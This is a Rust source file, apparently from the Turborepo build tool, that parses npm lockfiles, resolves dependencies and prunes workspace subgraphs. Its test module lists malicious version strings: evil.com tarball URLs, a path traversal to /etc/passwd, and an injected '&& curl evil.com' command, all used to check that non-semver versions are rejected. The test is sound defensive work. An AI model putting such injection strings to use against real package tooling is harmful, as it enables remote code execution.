use std::{any::Any, collections::HashMap};

use semver::Version;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use super::{Error, Lockfile, Package};

type Map<K, V> = std::collections::BTreeMap<K, V>;

// we change graph traversal now
// resolve_package should only be used now for converting initial contents
// of workspace package.json into a set of node ids
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct NpmLockfile {
    #[serde(rename = "lockfileVersion")]
    lockfile_version: i32,
    packages: Map<String, NpmPackage>,
    // We parse this so it doesn't end up in 'other' and we don't need to worry
    // about accidentally serializing it.
    #[serde(skip_serializing, default)]
    dependencies: Map<String, Value>,
    // We want to reserialize any additional fields, but we don't use them
    // we keep them as raw values to avoid describing the correct schema.
    #[serde(flatten)]
    other: Map<String, Value>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct NpmPackage {
    version: Option<String>,
    resolved: Option<String>,
    #[serde(default)]
    dependencies: Map<String, String>,
    #[serde(default)]
    dev_dependencies: Map<String, String>,
    #[serde(default)]
    peer_dependencies: Map<String, String>,
    #[serde(default)]
    optional_dependencies: Map<String, String>,
    // We want to reserialize any additional fields, but we don't use them
    // we keep them as raw values to avoid describing the correct schema.
    #[serde(flatten)]
    other: Map<String, Value>,
}

impl Lockfile for NpmLockfile {
    #[tracing::instrument(skip(self, _version))]
    fn resolve_package(
        &self,
        workspace_path: &str,
        name: &str,
        _version: &str,
    ) -> Result<Option<Package>, Error> {
        if !self.packages.contains_key(workspace_path) {
            return Err(Error::MissingWorkspace(workspace_path.to_string()));
        }

        let possible_keys = [
            // AllDependencies will return a key to avoid choosing the incorrect transitive dep
            name.to_string(),
            // If we didn't find the entry just using name, then this is an initial call to
            // ResolvePackage based on information coming from internal packages'
            // package.json First we check if the workspace uses a nested version of
            // the package
            format!("{workspace_path}/node_modules/{name}"),
            // Next we check for a top level version of the package
            format!("node_modules/{name}"),
        ];
        possible_keys
            .into_iter()
            .filter_map(|key| {
                self.packages.get(&key).map(|pkg| {
                    let version = pkg.version.clone().unwrap_or_default();
                    Ok(Package { key, version })
                })
            })
            .next()
            .transpose()
    }

    #[tracing::instrument(skip(self))]
    fn all_dependencies(&self, key: &str) -> Result<Option<HashMap<String, String>>, Error> {
        self.packages
            .get(key)
            .map(|pkg| {
                pkg.dep_keys()
                    .filter_map(|name| {
                        Self::possible_npm_deps(key, name)
                            .into_iter()
                            .find_map(|possible_key| {
                                let entry = self.packages.get(&possible_key)?;
                                match entry.version.as_deref() {
                                    Some(version) => Some(Ok((possible_key, version.to_string()))),
                                    None if entry.resolved.is_some() => None,
                                    None => Some(Err(Error::MissingVersion(possible_key.clone()))),
                                }
                            })
                    })
                    .collect()
            })
            .transpose()
    }

    fn subgraph(
        &self,
        workspace_packages: &[String],
        packages: &[String],
    ) -> Result<Box<dyn Lockfile>, Error> {
        let mut pruned_packages = Map::new();
        for pkg_key in packages {
            let pkg = self.get_package(pkg_key)?;
            pruned_packages.insert(pkg_key.to_string(), pkg.clone());
        }
        if let Some(root) = self.packages.get("") {
            pruned_packages.insert("".into(), root.clone());
        }
        for workspace in workspace_packages {
            let pkg = self.get_package(workspace)?;
            pruned_packages.insert(workspace.to_string(), pkg.clone());

            for (key, entry) in &self.packages {
                if entry.resolved.as_deref() == Some(workspace) {
                    pruned_packages.insert(key.clone(), entry.clone());
                    break;
                }
            }
        }
        Ok(Box::new(Self {
            lockfile_version: 3,
            packages: pruned_packages,
            dependencies: Map::default(),
            other: self.other.clone(),
        }))
    }

    fn encode(&self) -> Result<Vec<u8>, crate::Error> {
        Ok(serde_json::to_vec_pretty(&self)?)
    }

    fn global_change(&self, other: &dyn Lockfile) -> bool {
        let any_other = other as &dyn Any;
        if let Some(other) = any_other.downcast_ref::<Self>() {
            self.lockfile_version != other.lockfile_version
                || self.other.get("requires") != other.other.get("requires")
        } else {
            true
        }
    }

    fn turbo_version(&self) -> Option<String> {
        let turbo_entry = self.packages.get("node_modules/turbo")?;
        let version = turbo_entry.version.as_ref()?;
        Version::parse(version).ok()?;
        Some(version.clone())
    }

    fn human_name(&self, package: &Package) -> Option<String> {
        let npm_package = self.packages.get(&package.key)?;
        let version = npm_package.version.as_deref()?;
        let name = package.key.split("node_modules/").last()?;
        Some(format!("{name}@{version}"))
    }
}

impl NpmLockfile {
    pub fn load(content: &[u8]) -> Result<Self, Error> {
        let lockfile: NpmLockfile = serde_json::from_slice(content)?;

        // We don't support lockfiles without 'packages' as older versions
        // required reading through the contents of node_modules in order
        // to resolve dependencies.
        // See https://github.com/npm/cli/blob/9609e9eed87c735f0319ac0af265f4d406cbf800/workspaces/arborist/lib/shrinkwrap.js#L674
        if lockfile.lockfile_version <= 1
            || (lockfile.packages.is_empty() && !lockfile.dependencies.is_empty())
        {
            Err(Error::UnsupportedNpmVersion)
        } else {
            Ok(lockfile)
        }
    }

    fn get_package(&self, package: impl AsRef<str>) -> Result<&NpmPackage, Error> {
        let pkg_str = package.as_ref();
        self.packages
            .get(pkg_str)
            .ok_or_else(|| Error::MissingPackage(pkg_str.to_string()))
    }

    fn possible_npm_deps(key: &str, dep: &str) -> Vec<String> {
        let mut possible_deps = vec![format!("{key}/node_modules/{dep}")];

        let mut curr = Some(key);
        while let Some(key) = curr {
            let next = Self::npm_path_parent(key);
            possible_deps.push(format!("{}node_modules/{}", next.unwrap_or(""), dep));
            curr = next;
        }

        possible_deps
    }

    fn npm_path_parent(key: &str) -> Option<&str> {
        key.rsplit_once("node_modules/")
            .map(|(first, _)| first)
            .and_then(|parent| {
                if parent.is_empty() {
                    None
                } else {
                    Some(parent)
                }
            })
    }
}

impl NpmPackage {
    pub fn dep_keys(&self) -> impl Iterator<Item = &String> {
        self.dependencies
            .keys()
            .chain(self.dev_dependencies.keys())
            .chain(self.optional_dependencies.keys())
            .chain(self.peer_dependencies.keys())
    }
}

pub fn npm_subgraph(
    contents: &[u8],
    workspace_packages: &[String],
    packages: &[String],
) -> Result<Vec<u8>, Error> {
    let lockfile = NpmLockfile::load(contents)?;
    let pruned_lockfile = lockfile.subgraph(workspace_packages, packages)?;
    let new_contents = pruned_lockfile.encode()?;

    Ok(new_contents)
}

pub fn npm_global_change(prev_contents: &[u8], curr_contents: &[u8]) -> Result<bool, Error> {
    let prev_lockfile = NpmLockfile::load(prev_contents)?;
    let curr_lockfile = NpmLockfile::load(curr_contents)?;

    Ok(
        prev_lockfile.lockfile_version != curr_lockfile.lockfile_version
            || prev_lockfile.other.get("requires") != curr_lockfile.other.get("requires"),
    )
}
#[cfg(test)]
mod test {
    use super::*;

    #[test]
    fn test_npm_parent() {
        let tests = [
            ("apps/docs", None),
            ("apps/docs/node_modules/foo", Some("apps/docs/")),
            ("node_modules/foo", None),
            (
                "node_modules/foo/node_modules/bar",
                Some("node_modules/foo/"),
            ),
        ];

        for (key, parent) in &tests {
            assert_eq!(NpmLockfile::npm_path_parent(key), *parent);
        }
    }

    #[test]
    fn test_possible_npm_deps() {
        let tests = [
            (
                "node_modules/foo",
                "baz",
                vec!["node_modules/foo/node_modules/baz", "node_modules/baz"],
            ),
            (
                "node_modules/foo/node_modules/bar",
                "baz",
                vec![
                    "node_modules/foo/node_modules/bar/node_modules/baz",
                    "node_modules/foo/node_modules/baz",
                    "node_modules/baz",
                ],
            ),
            (
                "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/foo4",
                "bar",
                vec![
                    "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/foo4/\
                     node_modules/bar",
                    "node_modules/foo1/node_modules/foo2/node_modules/foo3/node_modules/bar",
                    "node_modules/foo1/node_modules/foo2/node_modules/bar",
                    "node_modules/foo1/node_modules/bar",
                    "node_modules/bar",
                ],
            ),
            (
                "apps/docs/node_modules/foo",
                "baz",
                vec![
                    "apps/docs/node_modules/foo/node_modules/baz",
                    "apps/docs/node_modules/baz",
                    "node_modules/baz",
                ],
            ),
        ];

        for (key, dep, expected) in &tests {
            assert_eq!(&NpmLockfile::possible_npm_deps(key, dep), expected);
        }
    }

    #[test]
    fn test_turbo_version_rejects_non_semver() {
        // Malicious version strings that could be used for RCE via npx should be
        // rejected
        let malicious_versions = [
            "file:./malicious.tgz",
            "https://evil.com/malicious.tgz",
            "http://evil.com/malicious.tgz",
            "git+https://github.com/evil/repo.git",
            "git://github.com/evil/repo.git",
            "../../../etc/passwd",
            "1.0.0 && curl evil.com",
        ];

        for malicious_version in malicious_versions {
            let json = format!(
                r#"{{
                    "lockfileVersion": 3,
                    "packages": {{
                        "": {{}},
                        "node_modules/turbo": {{
                            "version": "{}"
                        }}
                    }}
                }}"#,
                malicious_version
            );
            let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
            assert_eq!(
                lockfile.turbo_version(),
                None,
                "should reject malicious version: {}",
                malicious_version
            );
        }
    }
}
